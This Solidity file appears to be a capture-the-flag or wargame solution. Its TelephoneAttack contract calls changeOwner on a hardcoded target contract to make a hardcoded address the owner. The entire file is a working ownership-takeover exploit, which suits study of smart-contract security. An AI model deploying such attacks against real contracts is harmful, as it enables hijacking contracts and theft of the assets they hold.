//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
interface Telephone{
  function changeOwner(address owner) external;
}

contract TelephoneAttack {
  function attack() public returns (bool) {
    Telephone(0x870697E6E316D556FD97e0aC8A710A7920660675).changeOwner(0x94cD236f3fd4456E3B5a47d80695BA1b7363db78);
  }
}
